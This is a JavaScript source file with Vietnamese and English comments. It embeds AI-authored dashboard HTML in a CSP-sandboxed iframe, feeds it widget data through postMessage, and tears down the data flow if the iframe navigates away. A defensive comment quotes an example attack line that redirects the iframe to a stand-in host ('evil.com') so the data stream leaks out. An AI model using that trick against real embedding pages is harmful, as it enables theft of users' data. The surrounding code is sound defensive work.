// api/wwwroot/js/page-embed.js — shell pump cho dashboard kind='custom'.
// Dùng bởi cả dashboards.js (owner, iframeSrc=/api/dashboards/{id}/page/raw, fetch qua Api.get)
// và share.js (viewer, iframeSrc=/api/share/{token}/page, fetch qua route share no-SQL).
//
// An ninh: HTML của AI được response tự sandbox qua header CSP `sandbox allow-scripts`
// (DashboardPageHeaders.cs). KHÔNG đặt sandbox attribute trên thẻ iframe ở đây — attribute tạo
// opaque origin ngay từ request nạp iframe nên cookie phiên (edm_token / edm_share_*) sẽ không
// được gửi và route trả 401/404. Sandbox đến từ response là đủ: trang bị opaque origin sau khi
// nạp, không đọc được cookie/localStorage, connect-src 'none' chặn mọi fetch từ bên trong.
// Data vào trang qua postMessage từ shell này; chiều ngược lại trang chỉ được gửi 2 loại
// message: edm:ready (handshake) và edm:refresh (xin nạp lại, rate-limit 5s/endpoint) — không
// có đường nào khác từ trang ra ngoài.

const EdmPageEmbed = {
    mount(opts) {
        const { container, iframeSrc, widgets, fetchWidgetData, onWarning } = opts;

        const entries = new Map(); // widget_id -> {id, title, columns, rows, error?}
        widgets.forEach(w => entries.set(w.widget_id, {
            id: w.widget_id, title: w.title, columns: [], rows: [], error: 'Đang tải…'
        }));

        const iframe = document.createElement('iframe');
        iframe.src = iframeSrc;
        iframe.className = 'page-embed-frame';
        iframe.title = 'Dashboard';
        container.appendChild(iframe);

        let ready = false;
        let disposed = false;
        let loadCount = 0; // đếm sự kiện `load` của iframe — xem onIframeLoad bên dưới
        const intervals = [];
        const gens = new Map(); // widget_id -> generation, chặn response cũ ghi đè data mới hơn
        const lastManualRefresh = new Map(); // widget_id -> timestamp lần edm:refresh gần nhất

        function post() {
            if (disposed || !iframe.contentWindow) return;
            // targetOrigin '*' là bắt buộc: document trong iframe có opaque origin (CSP sandbox)
            // nên không thể chỉ định origin cụ thể. Payload chỉ chứa data widget mà người xem
            // này vốn được phép thấy qua chính các route data — không có gì nhạy cảm hơn.
            iframe.contentWindow.postMessage(
                { type: 'edm:data', endpoints: Array.from(entries.values()) }, '*');
        }

        async function refreshWidget(w) {
            if (disposed) return;
            // Hai lần refresh cùng widget có thể chồng lấn (request chậm của tick trước còn
            // pending khi tick sau bắn). Đánh số generation: chỉ response của lần gọi mới nhất
            // được ghi vào entries — response cũ về muộn thành no-op, không ghi đè data mới.
            const gen = (gens.get(w.widget_id) || 0) + 1;
            gens.set(w.widget_id, gen);
            let entry;
            try {
                const table = await fetchWidgetData(w.widget_id) || {};
                entry = {
                    id: w.widget_id, title: w.title,
                    columns: table.columns || [], rows: table.rows || []
                };
            } catch (err) {
                entry = {
                    id: w.widget_id, title: w.title, columns: [], rows: [],
                    error: (err && err.message) || 'Không tải được dữ liệu.'
                };
            }
            if (disposed || gens.get(w.widget_id) !== gen) return;
            entries.set(w.widget_id, entry);
            if (ready) post();
        }

        const onMessage = (e) => {
            if (disposed) return;
            if (e.source !== iframe.contentWindow) return;
            // Tài liệu AI hợp lệ bị sandbox bởi CSP header của response nên origin của nó là
            // opaque — serialize thành chuỗi literal 'null'. Document đã điều hướng sang origin
            // thật sẽ trượt check này, đóng nốt kẽ hở bypass handshake kiểu navigate-during-parse
            // (điều hướng trước khi sự kiện `load` đầu tiên kịp bắn).
            if (e.origin !== 'null') return;
            if (!e.data) return;

            if (e.data.type === 'edm:ready') {
                ready = true;
                post();
                return;
            }

            if (e.data.type === 'edm:refresh') {
                // Trang xin nạp lại chủ động (nút "Làm mới" / sau khi đổi bộ lọc). Rate-limit
                // 5s/endpoint chặn trang lỗi spam vòng lặp — xin quá hạn bị bỏ qua im lặng.
                // Độ tươi thật vẫn bị chặn bởi cache server (TTL = refresh_interval_sec, min 30s):
                // refresh trong TTL trả lại data cache, hữu ích chủ yếu khi trang mở lâu.
                // id không khớp endpoint nào -> targets rỗng -> no-op im lặng.
                const targets = e.data.id
                    ? widgets.filter(w => w.widget_id === e.data.id)
                    : widgets;
                const now = Date.now();
                targets.forEach(w => {
                    const last = lastManualRefresh.get(w.widget_id) || 0;
                    if (now - last < 5000) return;
                    lastManualRefresh.set(w.widget_id, now);
                    refreshWidget(w);
                });
            }
        };
        window.addEventListener('message', onMessage);

        widgets.forEach(w => {
            refreshWidget(w);
            const sec = Math.max(30, w.refresh_interval_sec || 60);
            intervals.push(setInterval(() => refreshWidget(w), sec * 1000));
        });

        const readyTimeout = setTimeout(() => {
            if (ready || disposed) return;
            if (typeof onWarning === 'function') {
                onWarning('Trang không gửi edm:ready — HTML có thể chưa đúng contract postMessage. Nhờ Claude kiểm tra lại. Vẫn thử bơm data…');
            }
            ready = true; // trang thiếu handshake nhưng có listener thì vẫn nhận được data
            post();
        }, 5000);

        // teardown(): stops ALL data flow — removes the message listener, clears every
        // interval/timeout, and flips `disposed`/`ready` so `post()` (including any microtask
        // already queued via a resolved fetchWidgetData promise) becomes a guaranteed no-op.
        // Shared by destroy() (owner explicitly closes/switches dashboards) and onIframeLoad
        // below (hostile in-iframe navigation detected). Idempotent — safe to call twice.
        function teardown() {
            if (disposed) return;
            disposed = true;
            ready = false;
            window.removeEventListener('message', onMessage);
            iframe.removeEventListener('load', onIframeLoad);
            intervals.forEach(clearInterval);
            intervals.length = 0;
            clearTimeout(readyTimeout);
        }

        // Attack this guards against: the sandbox that protects the AI-authored HTML comes from
        // the response's CSP header (DashboardPageHeaders.cs), NOT the iframe's `sandbox`
        // attribute (see file-top comment — the attribute would create an opaque origin at
        // request time and break cookie-based auth). That header-delivered sandbox applies only
        // to the document it was served with. If that document runs
        // `location.href = 'https://evil.com'`, the iframe navigates to a brand-new document
        // that never received our sandbox header — completely unsandboxed — while this shell
        // keeps merrily `postMessage(..., '*')`-ing every widget's query results into it once per
        // refresh tick. That's a live exfiltration channel to whatever origin the attacker
        // navigated to. Every iframe navigation fires a `load` event; the FIRST one is just the
        // legit initial document finishing its own load, so only loads after that count as a
        // navigation-away and trigger teardown.
        const onIframeLoad = () => {
            loadCount += 1;
            if (loadCount <= 1) return; // first load = legit initial document, not a navigation
            if (disposed) return;
            teardown();
            if (typeof onWarning === 'function') {
                onWarning('Trang dashboard đã điều hướng khỏi tài liệu gốc — đã ngừng bơm dữ liệu vì lý do an toàn.');
            }
        };
        iframe.addEventListener('load', onIframeLoad);

        return {
            destroy() {
                // Idempotent: teardown() no-ops if onIframeLoad already tore things down: we
                // still remove the iframe here every time destroy() is called explicitly. On the
                // navigation-detected path we deliberately do NOT remove the iframe — it stays
                // visible (still showing the hostile page) so the user sees the warning next to
                // something, but no more data ever flows to it.
                teardown();
                iframe.remove();
            }
        };
    }
};
